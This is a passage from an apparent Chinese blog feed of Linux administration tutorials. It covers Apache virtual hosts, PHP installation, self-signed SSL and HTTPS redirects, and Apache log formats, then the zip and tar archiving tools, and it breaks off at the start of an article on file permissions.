operator">&lt;</span>/VirtualHost<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>第五步：</strong>启动服务并测试</p><pre><code>[root@server1 ~]# systemctl restart httpd[root@server1 conf.d]# curl www.aa.comwww.aa.com[root@server1 conf.d]# curl www.bb.comwww.bb.com[root@server1 conf.d]# curl www.cc.comwww.cc.com</code></pre><h3 id="3-5-配置支持PHP"><a href="#3-5-配置支持PHP" class="headerlink" title="3.5    配置支持PHP"></a>3.5    配置支持PHP</h3><p>​    静态站点能够展示的内容有限，且每个页面均需建立页面文件，修改更新难度高，已经无法满足我们的需求。现在网站基本上都是动态的，而且非常流行和成熟的动态网站编程语言就是PHP,下面我们配置Apache支持PHP。</p><h4 id="1、安装额外YUM源"><a href="#1、安装额外YUM源" class="headerlink" title="1、安装额外YUM源"></a>1、安装额外YUM源</h4><p>​    由于CentOS7默认的YUM源提供的PHP版本较低（php5.4）,为了能够安装较新的PHP版本，我们需要安装额外的YUM源。</p><pre><code>[root@server1 ~]# rpm -Uvh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm[root@server1 ~]# rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm</code></pre><h4 id="2、安装PHP5-6及其组件"><a href="#2、安装PHP5-6及其组件" class="headerlink" title="2、安装PHP5.6及其组件"></a>2、安装PHP5.6及其组件</h4><pre><code>[root@server1 ~]# yum list php56*     #列出可用组件[root@server1 ~]# yum -y install php56w php56w-cli php56w-common php56w-devel php56-wembedded php56w-gd php56w-mbstring php56w-pdo php56w-xml php56w-fpm php56w-mysqlnd  php56w-opcache</code></pre><h4 id="3、验证"><a href="#3、验证" class="headerlink" title="3、验证"></a>3、验证</h4><p>在安装完成后重新启动Apache，创建PHP测试页面进行验证。</p><pre><code>[root@server1 ~]# systemctl restart httpd[root@server1 ~]# echo '&lt;?php phpinfo() ?&gt;' &gt; /var/www/html/index.php</code></pre><p>确保防火墙关闭，或者防火墙开启策略放行TCP协议的80端口。然后使用浏览器输入地址验证：http://&lt;服务器IP&gt;</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="C:%5CUsers%5CPing%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210423032628861.png" alt="image-20210423032628861"></p><h3 id="3-6-配置ssl加密传输"><a href="#3-6-配置ssl加密传输" class="headerlink" title="3.6 配置ssl加密传输"></a>3.6 配置ssl加密传输</h3><p>​    SSL(Secure  Socket Layer，安全套接字层)及其后续版本TLS（Transport Layer Security,传输层安全协议）都是将正常数据封装在受保护的加密包中的web协议。利用这样的技术，服务器与客户端之间可以发送加密的数据，而不用担心消息被外部拦截和读取。</p><p>HTTPS是在HTTP上建立SSL加密层，并对传输数据进行加密，是HTTP协议的安全版。现在它被广泛用于万维网上安全敏感的通讯，例如交易支付方面。</p><p>HTTPS主要作用是：</p><p>（1）对数据进行加密，并建立一个信息安全通道，来保证传输过程中的数据安全;</p><p>（2）对网站服务器进行真实身份认证。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://segmentfault.com/img/remote/1460000018992159/view" alt="preview"></p><h4 id="1、安装mod-ssl模块"><a href="#1、安装mod-ssl模块" class="headerlink" title="1、安装mod_ssl模块"></a>1、安装mod_ssl模块</h4><p>为了设置自签名证书，需要在服务器上安装mod_ssl模块（一个提供SSL加密支持的Apache模块）。</p><pre><code>[root@server1 ~]# yum -y install mod_ssl</code></pre><p>该模块会在安装的过程中自动启用，并在/etc/httpd/conf.d/目录下生成ssl.conf的配置文件，在重新启动后Apache即可正常使用mod_ssl模块提供的功能。</p><p>为Apache配置加密需要生成一个SSL证书，该证书会存储有关用户站点的一些信息，并附有一个密钥文件，允许服务器安全的处理加密的数据。</p><p>2、创建密钥和自签名证书。</p><p>使用openssl命令来创建SSL加密私钥和签名证书文件。</p><pre class="line-numbers language-shell"><code class="language-shell">[root@server1 ~]# openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/pki/tls/private/server.key -out /etc/pki/tls/certs/server.crtopenssl             创建和管理Openssl证书、密钥和其他文件的基本命令工具req -x509           指定使用X.509证书签名请求（CSR）进行管理。X.509是SSL和TLS用于密钥和证书管理的公钥基础标准-nodes                指定OpenSSL跳过使用密码保护证书的选项。-days  365            设置证书有效时间，举例为一年。-newkey   rsa  2048 指定需要同时生成一个新的证书和一个新的密钥。rsa 2048代表使用一个长度为2048位的rsa密钥。-keyout                指定私钥存放位置-out                指定证书存放位置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在执行该命令后，用户会得到一个提示，要求输入有关用户网站的基本信息。</p><pre><code>-----Country Name (2 letter code) [XX]:State or Province Name (full name) []:Locality Name (eg, city) [Default City]:Organization Name (eg, company) [Default Company Ltd]:Organizational Unit Name (eg, section) []:Common Name (eg, your name or your server's hostname) []:         #重点，输出站点绑定的域名或IPEmail Address []:</code></pre><h4 id="3、修改Apache配置文件以支持SSL"><a href="#3、修改Apache配置文件以支持SSL" class="headerlink" title="3、修改Apache配置文件以支持SSL"></a>3、修改Apache配置文件以支持SSL</h4><p>通过上一步创建的密钥和证书分别被放在了/etc/pki/tls/private/和/etc/pki/tls/certs/目录下，我们需要在Apache配置文件中指定该位置。</p><pre><code>[root@server1 ~]# vim /etc/httpd/conf.d/ssl.confSSLCertificateFile /etc/pki/tls/certs/server.crt       #修改SSLCertificateKeyFile /etc/pki/tls/private/server.key  #修改</code></pre><p>修改完成后我们需要重启Apache服务使配置生效。</p><pre><code>[root@server1 ~]# systemctl restart httpd</code></pre><h4 id="4、配置防火墙"><a href="#4、配置防火墙" class="headerlink" title="4、配置防火墙"></a>4、配置防火墙</h4><p>确认防火墙关闭状态，或者放行TCP协议的80端口和443端口。</p><pre><code>关闭防火墙    [root@server1 ~]# setenforce 0                #关闭selinux    [root@server1 ~]# systemctl stop firewalld    #关闭防火墙或者，放行端口        [root@server1 ~]# firewall-cmd --add-port=80/tcp --permanent     [root@server1 ~]# firewall-cmd --add-port=443/tcp --permanent    [root@server1 ~]# firewall-cmd --reload</code></pre><p>在浏览器输入“https://&lt;服务器IP&gt;”即可使用https加密传输协议访问网站。</p><h4 id="5、配置虚拟主机支持SSL"><a href="#5、配置虚拟主机支持SSL" class="headerlink" title="5、配置虚拟主机支持SSL"></a>5、配置虚拟主机支持SSL</h4><p>如果想要虚拟主机也使用SSL加密，需要在虚拟主机指令模块中添加SSL配置。</p><pre><code>&lt;VirtualHost 192.168.2.101:80&gt;    SSLEngine on    SSLCertificateFile      /etc/pki/tls/certs/server.crt       #指定证书位置            SSLCertificateKeyFile    /etc/pki/tls/private/server.key        #指定密钥位置    DocumentRoot /var/www/101/     &lt;Directory "/var/www/101/"&gt;        Options Indexes FollowSymLinks        AllowOverride None        Require all granted    &lt;/Directory&gt;&lt;/VirtualHost&gt;</code></pre><p>6、配置https重定向</p><p>配置完https后，为了保证更好的安全性建议停止所有通过http协议的访问请求，建议将所有通过http协议发起的请求自动转到加密的HTTPS。</p><p>我们在/etc/httpd/conf.d/目录下新建一个配置文件non-ssl.conf。编写一个匹配服务器IP (192.168.2.9 ) 80端口的模块，然后使用Redirect指令将匹配所有请求并转发到SSL VirtualHost。</p><pre><code>[root@server1 ~]# vim /etc/httpd/conf.d/non-ssl.conf&lt;VirtualHost 192.168.2.9:80&gt;        ServerName www.aa.com        Redirect "/" "https://192.168.2.9"&lt;/VirtualHost&gt;</code></pre><p>重启Apache使配置生效。</p><pre><code>[root@server1 ~]# systemctl restart httpd</code></pre><p>现在在浏览器地址栏输入<a href="http://192.168.2.9" target="_blank" rel="noopener">http://192.168.2.9</a> 会自动跳转到<a href="https://192.168.2.9" target="_blank" rel="noopener">https://192.168.2.9</a></p><h4 id="7、注意事项"><a href="#7、注意事项" class="headerlink" title="7、注意事项"></a>7、注意事项</h4><p>在测试的过程中，浏览器会警告该网站的证书不受信任。这是因为该网站的证书不是由浏览器受信任的证书颁发机构签名的，浏览器无法验证该网站的服务器身份。</p><p>这种情况下我们所创建的是一个自签名证书，而不是一个受信任的证书颁发机构签署的证书，所以这种情况是正常的。</p><h3 id="3-7-Apache日志详解"><a href="#3-7-Apache日志详解" class="headerlink" title="3.7    Apache日志详解"></a>3.7    Apache日志详解</h3><h4 id="1、关于日志的指令"><a href="#1、关于日志的指令" class="headerlink" title="1、关于日志的指令"></a>1、关于日志的指令</h4><p>LogFormat指令：定义格式并为格式指定一个名字，用于给CustomLog指令和ErrorLog指令直接引用格式的名字</p><p>CustomLog指令：设置日志文件存放位置，并指明日志文件所用格式</p><p>ErrorLog指令：设置错误日志存放位置，并指明日志文件所用格式</p><p>LogLevel指令：设置日志文件记录信息级别，可以选择debug、info、notice、warn、error、critical、alert、emerg，默认为warn.</p><h4 id="2、-access-log日志文件"><a href="#2、-access-log日志文件" class="headerlink" title="2、 access_log日志文件"></a>2、 access_log日志文件</h4><p>access_log日志文件主要是记录客户端访问服务器的所有请求信息。access_log日志文件所在位置由<a href="https://link.zhihu.com/?target=https%3A//www.docs4dev.com/docs/zh/apache/2.4/reference/mod-mod_log_config.html%23customlog" target="_blank" rel="noopener">customLog</a>指令设置，其指令语法如下：</p><pre class="line-numbers language-apacheconf"><code class="language-apacheconf"><span class="token directive-inline property">CustomLog</span> <span class="token string">"logs/access_log"</span> common<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置access_log日志文件格式可以使用LogFormat指令，日志的格式设置参数如下：</p><pre class="line-numbers language-text"><code class="language-text">LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\"" combinedLogFormat "%h %l %u %t \"%r\" %>s %b" common<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>日志格式设置有两种：common和combined。一般我们使用的是默认的common格式。</p><p>上面是日志记录内容的格式定义，格式是由百分号和相关指令组成，每个指令都表示服务器的一条特定的日志信息，文字字符也以字符串复制到日志输出中，如果要表示引号字符必须使用反斜杠进行转义，以防止将其解释为格式字符串的结尾。</p><p><strong>common格式的日志内容如下：</strong></p><pre class="line-numbers language-text"><code class="language-text">192.168.40.134 - - [19/Oct/2019:16:23:19 +0800] "GET /ecshop3/images/201605/thumb_img/62_thumb_G_1462952557730.jpg HTTP/1.1" 200 2064192.168.40.134 - - [19/Oct/2019:16:23:19 +0800] "GET /ecshop3/data/afficheimg/1462958213922967180.jpg HTTP/1.1" 200 158999<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>日志内容各部分的含义如下：</p><p>Ø 192.168.40.134（%h）</p><p>表示向服务器发出请求的客户端（远程主机）的IP地址。如果将HostnameLookups指令设置为On，那么这个内容可能为主机名，而非IP地址。但是，不建议使用此配置，因为它会显著降低服务器的速度。相反，最好使用日志后处理器（如logresolve）来确定主机名。</p><p>需要注意的是我们看到日志文件内容中的IP地址不一定是用户所在机器的地址。如果在用户和服务器之间存在代理服务器，则该地址将是代理的地址，而不是始发机器的IP地址。</p><p>Ø - (%l)</p><p>输出中出现的“－”字符，是连字符的意思，表示请求的信息不可用，这是由客户机的RFC 1413同身的一些特性标识的，这种信息是很不可靠的，但是如果将<a href="https://link.zhihu.com/?target=http%3A//httpd.apache.org/docs/2.4/mod/mod_ident.html%23identitycheck" target="_blank" rel="noopener">IdentityCheck</a>设置为On，那么apache服务器才会尝试去确定此信息。</p><p>Ø - (%u)</p><p>这是访问服务器的用户ID，这个ID是由HTTP身份验证来确定的，这个值一般是保存到远程用户环境变量中的CGI脚本中。如果服务器不信任此值，因为用户尚未通过身份验证。如果文档不受密码保护，则此部分将与前一部分一样为“-”。</p><p>Ø [19/Oct/2019:16:23:19 +0800] (%t)</p><p>表示访问服务器时，服务器的时间。+0800表示服务器所处时区位于UTC之后的8小时。</p><p>Ø GET /ecshop3/images/201605/thumb_img/62_thumb_G_1462952557730.jpg HTTP/1.1("%r")</p><p>表示访问服务器的资源的相关信息，包括请求方式、服务器资源位置、客户端向服务器发送请求时的协议和协议版本信息。</p><p>Ø 200 (%&gt;s)</p><p>这表示客户端请求服务器后返回的状态码，此信息非常有价值，它揭示了请求是否成功以及失败的。关于HTTP响应状态码的详细可以查看HTTP规范RFC2616第10节内容。</p><p>Ø 2064(%b)</p><p>表示服务器发送给客户端的字节数，但这个字节数，不包括响应头的信息，如果服务器没有向客户端发送任何内容，则该值为“-”，若记录为0则表示不记录任何内容。</p><p><strong>Combined 格式的日志内容如下：</strong></p><pre class="line-numbers language-text"><code class="language-text">127.0.0.1 - frank [10/Oct/2000:13:55:36 -0700] "GET /apache_pb.gif HTTP/1.0" 200 2326 "http://www.example.com/start.html" "Mozilla/4.08 [en] (Win98; I ;Nav)"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Combined 日志内容与common日志内容信息差不多，只是多出了以下两个字段：</p><p>Ø “<a href="http://www.example.com/start.html&quot;(\&quot;%{Referer}i\&quot;)" target="_blank" rel="noopener">http://www.example.com/start.html"(\"%{Referer}i\")</a></p><p>表示客户端所访问资源的引用站点。如实例中表示是所访问资源apache_pb.gif的链接或包含apache_pb.gif的页面。</p><p>Ø “Mozilla/4.08 [en] (Win98; I ;Nav)”("%{User-agent}i")</p><p>表示发送HTTP请求的客户端自身的标识信息。</p><h4 id="3、-error-log日志文件"><a href="#3、-error-log日志文件" class="headerlink" title="3、 error_log日志文件"></a>3、 error_log日志文件</h4><p>error_log记录两类错误信息：一是文档类的错误信息；二是CGI编译类的错误信息；是最要的日志文件之一，错误日志命名和位置是由ErrorLog指令来设置，error_log日志文件会记录处理请求时遇到的任何错误相关信息，当启动服务器或服务器操作出现问题时，首先会分析error_log日志文件，分析错误的详细信息以及如何解决问题。</p><p>error_log错误日志路径设置如下：</p><p>ErrorLog “logs/error_log”</p><p>错误日志的格式由ErrorLogFormat指令定义，您可以使用该指令自定义记录的值。如果不指定格式，则默认为“格式定义”。典型的日志消息如下：</p><pre class="line-numbers language-text"><code class="language-text">[Fri Sep 09 10:42:29.902022 2011] [core:error] [pid 35708:tid 4328636416] [client 72.15.99.187] File does not exist: /usr/local/apache2/htdocs/favicon.ico<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>第一部分内容表示记录错误日志信息的日期和时间。第二部分内容表示引起错误信息的是模块，以及该错误信息的严重级别。第三部分内容表示产生错误信息的进程号和线程号。第四部分内容表示发送请求的客户端信息。第五部分内容表示错误的详细信息，这种情况表示找不到资源，所访问的资源不存在。</code></pre><p>在linux或unix操作系统下，如果需要动态查看日志信息变化情况可以使用以下命令：</p><pre><code>tail -f error_log</code></pre><h4 id="4、Apache日志格式定制"><a href="#4、Apache日志格式定制" class="headerlink" title="4、Apache日志格式定制"></a>4、Apache日志格式定制</h4><p>参考默认日志格式</p><pre><code>LogFormat "%h %l %u %t \"%r\" %&gt;s %b \"%{Referer}i\" \"%{User-Agent}i\"" combinedLogFormat "%h %l %u %t \"%r\" %&gt;s %b" common</code></pre><p>Apache文档已经给出了所有可用于格式串的变量及其含义，下面是其译文：</p><pre><code>%...a: 远程IP地址%...A: 本地IP地址%...B: 已发送的字节数，不包含HTTP头%...b: CLF格式的已发送字节数量，不包含HTTP头。例如当没有发送数据时，写入‘-’而不是0。%...{FOOBAR}e: 环境变量FOOBAR的内容%...f: 文件名字%...h: 远程主机%...H 请求的协议%...{Foobar}i: Foobar的内容，发送给服务器的请求的标头行。%...l: 远程登录名字（来自identd，如提供的话）%...m 请求的方法%...{Foobar}n: 来自另外一个模块的注解“Foobar”的内容%...{Foobar}o: Foobar的内容，应答的标头行%...p: 服务器响应请求时使用的端口%...P: 响应请求的子进程ID。%...q 查询字符串（如果存在查询字符串，则包含“?”后面的部分；否则，它是一个空字符串。）%...r: 请求的第一行%...s: 状态。对于进行内部重定向的请求，这是指*原来*请求 的状态。如果用%...&gt;s，则是指后来的请求。%...t: 以公共日志时间格式表示的时间（或称为标准英文格式）%...{format}t: 以指定格式format表示的时间%...T: 为响应请求而耗费的时间，以秒计%...u: 远程用户（来自auth；如果返回状态（%s）是401则可能是伪造的）%...U: 用户所请求的URL路径%...v: 响应请求的服务器的ServerName%...V: 依照UseCanonicalName设置得到的服务器名字</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络运维篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux归档与压缩</title>
      <link href="/posts/1c094494.html"/>
      <url>/posts/1c094494.html</url>
      
        <content type="html"><![CDATA[<h1 id="归档与压缩"><a href="#归档与压缩" class="headerlink" title="归档与压缩"></a>归档与压缩</h1><p>归档，也称为打包，指的是一个文件或目录的集合，而这个集合被存储在一个文件中。归档文件没有经过压缩，因此，它占用的空间是其中所有文件和目录的总和。</p><pre><code>和归档文件类似，压缩文件也是一个文件和目录的集合，且这个集合也被存储在一个文件中，但它们的不同之处在于，压缩文件采用了不同的存储方式，使其所占用的磁盘空间比集合中所有文件大小的总和要小。</code></pre><pre><code>压缩是指利用算法将文件进行处理，已达到保留最大文件信息，而让文件体积变小的目的。其基本原理为，通过查找文件内的重复字节，建立一个相同字节的词典文件，并用一个代码表示。</code></pre><h2 id="一、Linux系统常见压缩包格式"><a href="#一、Linux系统常见压缩包格式" class="headerlink" title="一、Linux系统常见压缩包格式"></a>一、Linux系统常见压缩包格式</h2><p>1、压缩包格式：</p><table><thead><tr><th>Windows：</th><th>rar  zip</th></tr></thead><tbody><tr><td>Linux：</td><td>zip  tar  tar.gz  tar.bz2  tar.xz</td></tr></tbody></table><p>2、<strong>压缩包的好处主要有：</strong></p><p>1）节省磁盘空间占用率</p><p>2）节省网络传输带宽消耗</p><p>3）网络传输更加快捷</p><p>3、<strong>Linux**</strong>系统常见的后缀名所对应的压缩工具：**</p><table><thead><tr><th>.gz</th><th>gzip</th><th>#压缩工具压缩的文件</th></tr></thead><tbody><tr><td>.bz2</td><td>bzip2</td><td># 压缩工具压缩的文件</td></tr><tr><td>.tar</td><td>tar</td><td># tar没有压缩功能，只是把一个目录合并成一个文件</td></tr><tr><td>.tar.gz</td><td>tar、gzip</td><td>#先使用tar打包，然后使用gzip压缩归档</td></tr><tr><td>.tar.bz2</td><td>tar、bzip</td><td>#先使用tar打包，然后使用bzip压缩归档</td></tr><tr><td>.tar.xz</td><td>tar 、xz</td><td>#先使用tar打包，然后使用xz压缩归档</td></tr></tbody></table><p>注意：</p><p>1）Linux下常用压缩文件以.tar.gz结尾</p><p>2）Linux下压缩文件必须带后缀</p><h2 id="二、zip压缩工具："><a href="#二、zip压缩工具：" class="headerlink" title="二、zip压缩工具："></a>二、zip压缩工具：</h2><p>zip是压缩工具，unzip是解压工具</p><p>-q：不显示指令执行过程；</p><p>-r：递归处理，将指定目录下的所有文件和子目录一并处理；</p><pre class="line-numbers language-shell"><code class="language-shell">[root@192 ~]# lsanaconda-ks.cfg       公共  视频  文档  音乐initial-setup-ks.cfg  模板  图片  下载  桌面[root@192 ~]# zip cfg.zip anaconda-ks.cfg initial-setup-ks.cfg   adding: anaconda-ks.cfg (deflated 46%)  adding: initial-setup-ks.cfg (deflated 46%)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>[root@192 ~]# lsanaconda-ks.cfg       test  视频  下载cfg.zip               公共  图片  音乐initial-setup-ks.cfg  模板  文档  桌面[root@192 ~]# zip -r test.zip test/  adding: test/ (stored 0%)[root@192 ~]# lsanaconda-ks.cfg       test      模板  文档  桌面cfg.zip               test.zip  视频  下载initial-setup-ks.cfg  公共      图片  音乐</code></pre><pre><code>[root@192 ~]# unzip -d /mnt/ cfg.zip Archive:  cfg.zip  inflating: /mnt/anaconda-ks.cfg      inflating: /mnt/initial-setup-ks.cfg  [root@192 ~]# ls /mnt/anaconda-ks.cfg  initial-setup-ks.cfg</code></pre><h2 id="三、tar压缩工具"><a href="#三、tar压缩工具" class="headerlink" title="三、tar压缩工具"></a>三、tar压缩工具</h2><p>tar是Linux下最常用的压缩与解压缩工具，支持文件和目录的压缩（原始含义归档，不带压缩功能）。</p><p>按照 tar 选项的行为，分为三类：</p><p><a href="https://imgtu.com/i/cqZXNQ" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://z3.ax1x.com/2021/04/21/cqZXNQ.png" alt="cqZXNQ.png"></a></p><p> 常用组合：</p><p>tf #查看所有tar类压缩包内容（.tar/.tar.gz/.tar.bz2/.tar.xz）</p><p>xf #解压缩所有tar类压缩包（.tar/.tar.gz/.tar.bz2/.tar.xz）</p><h3 id="tar命令选项："><a href="#tar命令选项：" class="headerlink" title="tar命令选项："></a>tar命令选项：</h3><table><thead><tr><th>-A或–catenate：</th><th>新增文件到以存在的备份文件；</th></tr></thead><tbody><tr><td>-c或–create：</td><td>建立新的备份文件；</td></tr><tr><td>-C &lt;目录&gt;：</td><td>这个选项用在解压缩，若要在特定目录解压缩，可以使用这个选项。</td></tr><tr><td>-X&lt;文件名列表&gt;：</td><td>排除多个文件，写入需要排除的文件名名称</td></tr><tr><td>-x或–extract或–get：</td><td>从备份文件中还原文件；</td></tr><tr><td>-t或–list：</td><td>列出备份文件的内容；</td></tr><tr><td>-z或–gzip或–ungzip：</td><td>通过gzip指令处理备份文件；</td></tr><tr><td>-Z或–compress或–uncompress</td><td>通过compress指令处理备份文件；</td></tr><tr><td>-f&lt;备份文件&gt;或–file=&lt;备份文件&gt;：</td><td>指定备份文件；</td></tr><tr><td>-v或–verbose：</td><td>显示指令执行过程；</td></tr><tr><td>-r：</td><td>添加文件到已经压缩的文件；</td></tr><tr><td>-u：</td><td>添加改变了和现有的文件到已经存在的压缩文件；</td></tr><tr><td>-j：</td><td>支持bzip2解压文件；</td></tr><tr><td>-v：</td><td>显示操作过程或者列出详细信息；</td></tr><tr><td>–exclude=&lt;范本样式&gt;：</td><td>排除符合范本样式的文件或目录。</td></tr></tbody></table><h3 id="tar命令示例："><a href="#tar命令示例：" class="headerlink" title="tar命令示例："></a>tar命令示例：</h3><h4 id="1、压缩文件或者目录："><a href="#1、压缩文件或者目录：" class="headerlink" title="1、压缩文件或者目录："></a>1、压缩文件或者目录：</h4><pre><code>[root@192 test]# ls1.txt  2.txt  3.txt  [root@192 test]# tar -cvf test.tar *.txt1.txt2.txt3.txt[root@192 test]# ls1.txt  2.txt  3.txt  test.tar</code></pre><pre><code>[root@192 test]# ls1.txt  2.txt  3.txt  test.tar[root@192 test]# tar -zcvf test.tar.gz *.txt1.txt2.txt3.txt[root@192 test]# ls1.txt  2.txt  3.txt  test.tar  test.tar.gz</code></pre><pre><code>[root@192 test]# ls1.txt  2.txt  3.txt  test.tar  test.tar.gz[root@192 test]# tar -jcvf test.tar.bz2 *.txt1.txt2.txt3.txt[root@192 test]# ls1.txt  2.txt  3.txt  test.tar  test.tar.bz2  test.tar.gz</code></pre><p><strong>–remove-files打包后删除原文件：</strong></p><pre><code>[root@192 test]# ls1.txt  2.txt  3.txt[root@192 test]# tar -zcvf test.tar.gz *.txt --remove-files1.txt2.txt3.txt[root@192 test]# lstest.tar.gz</code></pre><p><strong>–exclude排除指定的单个文件进行压缩：</strong></p><pre><code>[root@192 test]# ls1.txt  2.txt  3.txt  4.txt  5.txt[root@192 test]# tar -zcvf test.tar.gz *.txt --exclude 2.txt1.txt3.txt4.txt5.txt[root@192 test]# tar -tvf test.tar.gz -rw-r--r-- root/root         0 2021-04-20 23:57 1.txt-rw-r--r-- root/root         0 2021-04-20 23:57 3.txt-rw-r--r-- root/root         0 2021-04-20 23:57 4.txt-rw-r--r-- root/root         0 2021-04-20 23:57 5.txt</code></pre><p><strong>-X 排除多个文件：</strong></p><pre><code>[root@192 test]# echo -e "1.txt\n2.txt" &gt;ex.list[root@192 test]# cat ex.list 1.txt2.txt[root@192 test]# ls1.txt  2.txt  3.txt  4.txt  5.txt  ex.list[root@192 test]# tar -zcvf test.tar.gz *.txt -X ex.list 3.txt4.txt5.txt[root@192 test]# tar -tf test.tar.gz 3.txt4.txt5.txt</code></pre><h4 id="2、查看压缩包里的内容："><a href="#2、查看压缩包里的内容：" class="headerlink" title="2、查看压缩包里的内容："></a>2、查看压缩包里的内容：</h4><pre><code>[root@192 test]# ls1.txt  2.txt  3.txt  4.txt  5.txt  ex.list  test.tar.gz[root@192 test]# tar -tf test.tar.gz 3.txt4.txt5.txt[root@192 test]# tar -tvf test.tar.gz -rw-r--r-- root/root         0 2021-04-20 23:57 3.txt-rw-r--r-- root/root         0 2021-04-20 23:57 4.txt-rw-r--r-- root/root         0 2021-04-20 23:57 5.txt</code></pre><h4 id="3、解压压缩包里的内容："><a href="#3、解压压缩包里的内容：" class="headerlink" title="3、解压压缩包里的内容："></a>3、解压压缩包里的内容：</h4><pre><code>[root@192 test]# lstest.tar.gz[root@192 test]# tar -zxvf test.tar.gz 3.txt4.txt5.txt[root@192 test]# ls3.txt  4.txt  5.txt  test.tar.gz</code></pre><pre><code>[root@192 test]# lstest.tar.bz2[root@192 test]# tar -jxvf test.tar.bz2 1.txt2.txt3.txt4.txt5.txt[root@192 test]# ls1.txt  2.txt  3.txt  4.txt  5.txt  test.tar.bz2</code></pre><p>只将压缩包里的部分文件解压出来，可以先查看压缩包里的文件名，再根据需要解压文件：</p><pre><code>[root@192 test]# lstest.tar.bz2[root@192 test]# tar -tf test.tar.bz2 1.txt2.txt3.txt4.txt5.txt[root@192 test]# tar -jxvf test.tar.bz2 2.txt 4.txt2.txt4.txt[root@192 test]# ls2.txt  4.txt  test.tar.bz2</code></pre><p><strong>-C 将压缩包里的文件解压到指定的目录下面：</strong></p><pre><code>[root@192 test]# [root@192 test]# lstest.tar.bz2[root@192 test]# ls /mnt/[root@192 test]# tar -jxvf test.tar.bz2 -C /mnt/1.txt2.txt3.txt4.txt5.txt[root@192 test]# lstest.tar.bz2[root@192 test]# ls /mnt/1.txt  2.txt  3.txt  4.txt  5.txt</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络运维篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux文件权限管理</title>
      <link href="/posts/ad5612ad.html"/>
      <url>/posts/ad5612ad.html</url>
      
        <content type="html"><![CDATA[<h1 id="Linux文件权限管理"><a href="#Linux文件权限管理" class="headerlink" title="Linux文件权限管理"></a>Linux文件权限管理</h1><h2 id="一、文件存取访问身份"><a href="#一、文件存取访问身份" class="headerlink" title="一、文件存取访问身份"></a><strong>一、文件存取访问身份</strong></h2><p>Linux的优秀之处在于它的多用户多任务环境，为了方便文件的管理，有三种文件存取访问身份，分别是：用户、用户组、其他</p><h2 id="二、文件属性"><a href="#二、文件属性" class="headerlink" title="二、文件属性"></a><strong>二、文件属性</strong></h2><p>我们在用ls列举出当前工作目录下的文件时，显示的只是文件或目录名，要想显示属性，使用ls -l，要列举出隐藏文件，使用ls -al。</p><p>第一列为10个字符，代表这个文件的类型和权限。</p><p>第二列是一个数字，表示有多少文件名链接到此节点。（Linux的目录树是使用文件名来记录的）</p><p>第三列表示这个文件的所有者账号。</p><p>第四列表示这个文件的所属组账号。</p><p>第五列的数字代表这个文件的大小，单位是Byte。</p><p>第六列是这个文件的创建日期或者最近修改日期。</p><p>最后列是文件名，如果文件名前多个‘.’，代表这个文件是隐藏文件。</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190505120449206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RpeWlkYXk=,size_16,color_FFFFFF,t_70" alt="img"></p><p><strong>文件种类以及其属性表示</strong></p><pre><code>-：一般文件d：目录文件l：链接文件b：块设备文件，即一些存储数据以提供系统随机访问的接口设备，如硬盘、软盘等c：字符设备文件，即一些串行端口的接口设备，如鼠标、键盘等</code></pre><p><strong>linux系统约定不同类型文件默认的颜色：</strong></p><pre><code>- 白色：表示普通文件- 蓝色：表示目录- 绿色：表示可执行文件- 红色：表示压缩文件- 浅蓝色：链接文件- 红色闪烁：表示链接的文件有问题- 黄色：表示设备文件- 灰色：表示其它文件</code></pre><h2 id="三、文件和目录权限"><a href="#三、文件和目录权限" class="headerlink" 